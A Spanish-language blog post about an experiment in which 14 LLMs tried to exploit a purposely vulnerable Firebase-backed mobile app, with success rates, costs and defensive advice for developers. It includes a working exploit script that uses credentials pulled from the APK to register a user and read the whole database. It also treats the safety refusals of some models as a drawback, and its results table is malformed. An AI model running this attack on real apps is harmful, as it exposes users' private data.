## El experimento

Kasra Rahjerdi, un investigador de seguridad que se dedica a auditar aplicaciones, tuvo una idea tan simple como cara: construir una app vulnerable a propósito y soltar 14 LLMs distintos a ver si encontraban el fallo. El resultado es uno de los experimentos más honestos y prácticos que he visto sobre las capacidades reales de los modelos actuales como herramientas de pentesting.

La aplicación era una _book review app_ hecha con React Native (usando Expo) y un backend en FastAPI. A simple vista, la API estaba bien asegurada: autenticación, autorización, endpoints protegidos. Pero había una trampa: la capa de datos usaba Firebase, y el archivo `google-services.json` —con las credenciales completas para acceder a Firestore— estaba **empaquetado dentro del APK**.

Este es un fallo que Kasra ha visto en producción muchas veces. Lo llaman _Broken Access Control_ o _Missing Object-Level Authorization_: tienes una API blindada pero la base de datos está abierta por otro lado. Un clásico.

## Cómo funciona la vulnerabilidad

Cuando empaquetas una app React Native con Expo, el archivo `google-services.json` de Firebase se incluye en el bundle. Cualquiera que descargue el APK puede extraerlo. Y si los permisos de Firestore no están correctamente configurados, ese `.json` es la llave del reino.

Veamos un ejemplo simplificado de cómo se ve esta vulnerabilidad en código:

```python
# backend/api.py — la API está correctamente asegurada
from fastapi import FastAPI, Depends, HTTPException
from firebase_admin import auth, firestore

app = FastAPI()
db = firestore.client()

def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        decoded = auth.verify_id_token(token)
        return decoded["uid"]
    except Exception:
        raise HTTPException(status_code=401)

@app.get("/reviews/private")
async def get_private_reviews(user_id: str = Depends(get_current_user)):
    """Solo el usuario autenticado ve sus reseñas privadas."""
    reviews = db.collection("reviews").where("user_id", "==", user_id).get()
    return [r.to_dict() for r in reviews]
```

Hasta aquí todo bien. El problema es que el APK contiene esto:

```json
// google-services.json — extraído del APK
{
  "project_info": {
    "project_id": "book-reviews-app-12345",
    "project_number": "123456789012",
    "firebase_url": "https://book-reviews-app-12345.firebaseio.com"
  },
  "client": [{
    "client_info": {
      "mobilesdk_app_id": "1:123456789012:android:abc123def456",
      "android_client_info": { "package_name": "com.kasra.bookreviews" }
    },
    "api_key": "AIzaSyBuscasTuClaveDeFirebaseAqui123456789"
  }]
}
```

El `api_key` de Firebase permite autenticarse directamente contra Firebase Auth y luego acceder a Firestore **sin pasar por la API**. Y si las reglas de seguridad de Firestore permiten leer la colección de reseñas sin restricciones adicionales, el atacante tiene acceso completo.

Un script de ataque con el SDK de Firebase sería así:

```python
# exploit.py — usando el google-services.json extraído
import pyrebase

config = {
    "apiKey": "AIzaSyBuscasTuClaveDeFirebaseAqui123456789",
    "authDomain": "book-reviews-app-12345.firebaseapp.com",
    "projectId": "book-reviews-app-12345",
    "databaseURL": "https://book-reviews-app-12345.firebaseio.com"
}

firebase = pyrebase.initialize_app(config)
auth = firebase.auth()

# Crear usuario nuevo sin pasar por la API
user = auth.create_user_with_email_and_password(
    "hacker@test.com", "password123"
)

# Acceder directamente a Firestore con las credenciales del nuevo usuario
db = firebase.database()
reviews = db.child("reviews").get()
for review in reviews.each():
    print(review.val())
```

Esta es la esencia del ataque. No hace falta romper la API. Basta con extraer el `google-services.json` del APK y usar el SDK de Firebase para saltarse todas las capas de seguridad.

## Los resultados: solo 4 de 14 modelos lo lograron

Kasra ejecutó 10 intentos por cada modelo, con un límite de 10 dólares y 2 horas por intento. Usó `pi` como harness junto con `pi-goal-x` para forzar a los modelos a seguir intentándolo. Los resultados, con su tasa de éxito:

|--------|----------|---------|-----------|---------|
| GPT-5.5 | 7/10 | 40-89% | $6.62 | $9.46 |
| DeepSeek V4 Pro | 3/10 | 11-60% | $0.19 | $0.62 |
| Claude Sonnet 4.6 | 2/10 | 6-51% | $9.15 | $45.75 |
| Claude Opus 4.8 | 2/10 | 6-51% | $3.23 | $16.15 |
| DeepSeek V4 Flash | 0/10 | — | $0.08 | — |
| Gemini 3.1 Pro | 0/10 | — | $1.04 | — |

| MiniMax M2.7 | 0/10 | — | $0.72 | — |
| Step 3.7 Flash | 0/10 | — | $0.53 | — |

También probó algunos modelos con menos repeticiones: GLM 5.1 (1/4), Qwen 3.7 Max (0/6), Grok Build 0.1 (0/6), MiniMax M3 (0/3), Kimi K2.6 (1/1) y Owl Alpha (0/10, este gratis).

## Lo que nos dicen estos números

Hay varias lecturas interesantes aquí:

**GPT-5.5 está en otra liga.** 7 de 10 intentos exitosos, y en casi todos los casos identificó Firebase como vector de ataque tras desempaquetar el APK. No se distrajo con la API ni con la app de React Native. Fue directo al grano.

**DeepSeek V4 Pro es el rey del coste-eficiencia.** $0.62 por éxito. Para ser un modelo que cuesta órdenes de magnitud menos que GPT-5.5, su rendimiento es brutal. Eso sí, solo 3 de 10 intentos llegaron al objetivo. En 5 de los intentos fallidos, el modelo nunca llegó a tocar Firebase: se quedó atrapado analizando la API.

**Los Claude tienen un problema de _refusals_.** Tanto Sonnet 4.6 como Opus 4.8 mostraron comportamiento errático con las _security guardrails_. Opus particularmente: llegó muy cerca de la solución en varias ocasiones pero los filtros de seguridad cortaron la sesión antes de completar. No son _refusals_ inmediatos como los de Gemini, sino tardíos: el modelo empieza a trabajar y a medio camino decide que lo que está haciendo «no es ético».

**Gemini directamente se niega.** Los dos modelos de Gemini tuvieron _refusals_ inmediatos. El caso de Gemini 3.1 Pro es revelador: mediana de 9.000 tokens por intento frente a los 100.000+ del resto. Básicamente decía «no voy a hacer esto» y se acababa la ejecución.

**Los modelos chinos son más agresivos atacando.** Varios modelos (DeepSeek, Qwen, MiniMax) fueron directos a intentar manipular la base de datos sin los titubeos éticos de otros. Esto es un dato interesante: las diferencias culturales y de _alignment_ se manifiestan en cómo abordan tareas ofensivas.

## Mi opinión

Este experimento me parece oro puro por varias razones.

Primero, es **realista**. No es un benchmark académico con un dataset sintético. Es una vulnerabilidad que Kasra ha visto en aplicaciones reales de producción con Firebase y Supabase. El fallo de tener la API asegurada pero la base de datos abierta es absurdamente común.

Segundo, los resultados son **matizados y útiles**. No es «GPT-5.5 es bueno y el resto malo». DeepSeek V4 Pro es una alternativa viable si necesitas escalar a cientos de pruebas paralelas sin arruinarte. Y Claude, con sus _guardrails_, puede ser útil para un tipo de auditoría más supervisada donde no quieres que el modelo ejecute acciones destructivas sin confirmación.

Tercero, el coste real de usar LLMs para pentesting está lejos de ser trivial. $1,500 para probar 14 modelos contra **una sola vulnerabilidad conocida**. Si estás auditando una aplicación real con docenas de posibles vectores de ataque, la factura se dispara. Esto no sustituye a un auditor humano, lo complementa.

Cuarto, y quizás lo más relevante para los desarrolladores: **si tu `google-services.json` está en el APK, ya has perdido**. No hace falta un LLM avanzado para explotar esto. Cualquier persona con `apktool` y el SDK de Firebase puede hacerlo. La lección no es «protege tu app de los LLMs», es «no metas tus credenciales en el cliente».

## La lección real para desarrolladores

Más allá del experimento, la vulnerabilidad que Kasra expuso tiene una solución sencilla que muchos equipos ignoran: **usa Firebase App Check**. Esta herramienta verifica que las peticiones a los servicios de Firebase vengan desde tu aplicación legítima, no desde un script externo. Combinado con reglas de seguridad de Firestore correctamente configuradas (donde solo el usuario autenticado puede leer sus propios datos), cierras este vector de ataque por completo.

El experimento de Kasra no prueba que los LLMs sean hackers imparables. Prueba que los fallos de arquitectura más básicos siguen siendo los más explotables, los automatice quien los automatice.

Y si eres desarrollador, hoy es un buen día para revisar qué archivos `.json`, `.plist`, o `.env` están empaquetados en tus builds de producción. Porque si un LLM puede encontrarlos, un atacante con `grep` también.
